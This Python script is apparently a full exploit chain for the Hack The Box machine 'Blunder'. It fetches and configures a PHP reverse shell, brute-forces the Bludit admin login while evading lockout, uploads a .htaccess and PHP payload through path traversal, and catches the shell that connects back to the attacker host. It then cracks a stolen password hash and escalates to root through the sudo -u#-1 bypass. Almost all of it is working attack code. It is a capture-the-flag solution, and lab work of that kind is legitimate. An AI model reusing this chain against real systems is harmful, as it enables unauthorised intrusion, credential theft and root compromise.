import io
import os
import re
import socket
import subprocess
from termcolor import colored
import threading
import time
import typing
import uuid

from bs4 import BeautifulSoup
import requests


def build_php_reverse_shell() -> str:
    print("[*] Building PHP reverse shell...")
    response = requests.get(
        "https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php"
    )
    assert response.status_code == 200, "[!] Failed to grab PHP reverse shell from github"
    php_reverse_shell: str = response.text
    php_reverse_shell: str = re.sub("'127.0.0.1'", "'10.10.15.215'", php_reverse_shell)
    php_reverse_shell: str = re.sub("1234", "80", php_reverse_shell)
    return php_reverse_shell


def trigger_reverse_shell(cookie: str) -> None:
    print("[*] Triggering shell...")
    response = requests.get(
        "http://10.10.10.191/bl-content/tmp/tgihf.php",
        headers={
            "User-Agent": "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0",
            "Cookie": cookie
        }
    )
    assert response.status_code == 200, "[!] Failed to trigger payload"


def get_username() -> str:

    # Find BLUDIT username
    # /todo.txt found with:
    #   wfuzz -c -w /usr/share/wordlists/dirb/common.txt \
    #   --hc 404,403 -u "http://10.10.10.191/FUZZ.txt"
    print("[*] Grabbing username for login...")
    url = "http://10.10.10.191/todo.txt"
    response = requests.get(url)
    pattern = r"Inform (.+) that the new blog needs images - PENDING"
    result = re.search(pattern, response.text)
    username: str = result.group(1)
    return username


def bruteforce_login(username: str) -> str:

    # Request login page to grab cookie and CSRF token
    url = "http://10.10.10.191/admin/"
    response = requests.get(url)
    assert response.status_code == 200, "[!] Failed to grab login page"
    cookie: str = response.headers.get("Set-Cookie")
    soup = BeautifulSoup(response.content, "html.parser")
    csrf = soup.find(id="jstokenCSRF").get("value")

    # Crawl web page and generate wordlist using cewl
    wordlist_path = "wordlist.txt"
    subprocess.getoutput(f"cewl -d 10 -m 1 -w {wordlist_path} http://10.10.10.191")

    # Brute force login page (cookie and CSRF required) to get BLUDIT password
    with open(wordlist_path, "r") as f:
        words = f.read().split('\n')
    os.remove(wordlist_path)

    print("[*] Brute forcing login page...")
    password = None
    url = "http://10.10.10.191/admin/"
    for word in words:
        response = requests.post(
            url,
            headers={
                "Cookie": cookie,
                "X-Forwarded-For": uuid.uuid4().hex[:16],
                "Referrer": "http://10.10.10.191/admin/"
            },
            data={
                "tokenCSRF": csrf,
                "username": username,
                "password": word,
                "save": ""
            }
        )
        soup = BeautifulSoup(response.content, "html.parser")
        csrf = soup.find(id="jstokenCSRF").get("value")
        if response.history:
            password: str = word
            break

    return cookie


def upload_htaccess_and_payload(cookie: str, payload: str) -> None:

    # Request new-content view and grab CSRF
    url = "http://10.10.10.191/admin/new-content"
    response = requests.get(
        url,
        # proxies=proxy,
        headers={
            "User-Agent": "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0",
            "Cookie": cookie,
            "Referrer": "http://10.10.10.191/admin/dashboard"
        },
    )
    assert response.status_code == 200, "[!] Failed to grab new-content page"
    soup = BeautifulSoup(response.content, "html.parser")
    csrf = soup.find(id="jstokenCSRF").get("value")

    # Upload .htaccess and payload
    print("[*] Uploading .htaccess...")
    url = "http://10.10.10.191/admin/ajax/upload-images"
    response = requests.post(
        url,
        headers={
            "User-Agent": "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0",
            "Cookie": cookie
        },
        files={
            "images[]": (
                ".htaccess",
                io.StringIO('RewriteEngine off\r\nAddType application/x-httpd-php .jpg'),
                "image/jpeg",
            ),
            "uuid": (None, uuid.uuid4().hex),
            "tokenCSRF": (None, csrf),
        }
    )
    assert response.status_code == 200, "[!] Failed to upload .htaccess"

    print("[*] Uploading payload...")
    response = requests.post(
        url,
        headers={
            "User-Agent": "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0",
            "Cookie": cookie
        },
        files={
            "images[]": (
                "tgihf.php",
                io.StringIO(payload),
                "image/gif",
            ),
            "uuid": (None, "../../tmp"),
            "tokenCSRF": (None, csrf),
        }
    )
    assert response.status_code == 200, "[!] Failed to upload payload"


def temporary_login() -> str:

    # Request login page to grab cookie and CSRF token
    url = "http://10.10.10.191/admin/"
    response = requests.get(url)
    assert response.status_code == 200, "[!] Failed to grab login page"
    cookie: str = response.headers.get("Set-Cookie")
    soup = BeautifulSoup(response.content, "html.parser")
    csrf = soup.find(id="jstokenCSRF").get("value")

    # Temporary login while bulding the script, uncomment above when finished
    response = requests.post(
        "http://10.10.10.191/admin/",
        headers={
            "User-Agent": "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0",
            "Cookie": cookie,
            "X-Forwarded-For": uuid.uuid4().hex[:16],
            "Referrer": "http://10.10.10.191/admin/"
        },
        data={
            "tokenCSRF": csrf,
            "username": "fergus",
            "password": "RolandDeschain",
            "save": ""
        }
    )
    assert response.status_code == 200, "[!] Failed to login with credentials"

    return cookie


def catch_user_shell() -> typing.Tuple[socket.socket, socket.socket]:

    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind(("0.0.0.0", 80))
    print("[*] Listening for connections...")
    server_socket.listen(5)
    client_socket, client_address = server_socket.accept()
    print("[*] Connected!")
    client_socket.recv(1024)
    client_socket.send(b"\n")
    client_socket.recv(1024)
    client_socket.send(b"\n")
    client_socket.recv(1024)
    client_socket.recv(1024)

    return server_socket, client_socket


def send_command(sock: socket.socket, command: str) -> str:
    sock.send(command.encode() + b"\n")
    response = sock.recv(1024)
    return response.decode().rstrip()


def get_hugo_passwd(sock: socket.socket) -> str:
    print("[*] Grabbing hugo's BLUDIT password hash...")
    db_content: str = send_command(sock, "cat /var/www/bludit-3.10.0a/bl-content/databases/users.php")
    regex = r'"password": "(.+)"'
    result: str = re.search(regex, db_content)
    assert result, "[!] Couldn't grab hugo's password hash"
    sha1: str = result.group(1)
    print("[*] Looking up hugo's password hash among common sha1 hashes...")
    return lookup_common_sha1(sha1)


def lookup_common_sha1(sha1: str) -> str:
    url = "https://sha1.gromweb.com/"
    response = requests.get(url, params={"hash": sha1})
    assert response.status_code == 200, "[!] Couldn't lookup sha1"
    soup = BeautifulSoup(response.text, "html.parser")
    element = soup.find("em", {"class": "long-content string"})
    assert element is not None, "[!] Couldn't parse sha1 lookup HTML"
    password: str = "".join(element.contents)
    assert password is not None, "[!] Couldn't extract plaintext password from HTML"
    return password


def get_userflag(sock: socket.socket, passwd: str) -> str:
    print("[*] Logging in as hugo and grabbing the user flag...")
    send_command(sock, "su hugo")
    send_command(sock, passwd)
    print("[*] Grabbing the user flag...")
    return send_command(sock, "cat /home/hugo/user.txt")


def get_rootflag(sock: socket.socket, passwd: str) -> str:
    print("[*] Leveraging sudo vulnerability to escalate to root...")
    output: str = send_command(sock, "python -c 'import pty; pty.spawn(\"/bin/bash\")'")
    output: str = send_command(sock, "sudo -u#-1 /bin/bash")
    sock.recv(1024)
    output: str = send_command(sock, passwd)
    sock.recv(1024)
    print("[*] Grabbing the root flag...")
    output: str = send_command(sock, "cat /root/root.txt")
    root_flag: bytes = sock.recv(1024)
    root_flag: str = root_flag.decode().split('\n')[0]
    return root_flag


def main():
    proxy = {"http": "http://127.0.0.1:8080"}

    php_reverse_shell: str = build_php_reverse_shell()
    username: str = get_username()
    cookie: str = bruteforce_login(username)
    cookie: str = temporary_login()
    upload_htaccess_and_payload(cookie, php_reverse_shell)

    t = threading.Timer(1, function=trigger_reverse_shell, args=[cookie])
    t.daemon = True
    t.start()

    server, client = catch_user_shell()
    hugo_passwd: str = get_hugo_passwd(client)
    user_flag: str = get_userflag(client, hugo_passwd)
    print(colored(f"[*] User flag: {user_flag}", "blue"))

    root_flag: str = get_rootflag(client, hugo_passwd)
    print(colored(f"[*] Root flag: {root_flag}", "blue"))

    client.close()
    server.close()


if __name__ == '__main__':

    if os.geteuid() != 0:
        print("[!] Must be root. Exiting...")
        exit(1)

    print(colored("[*] Hack the Box: Blunder", "yellow"))
    main()
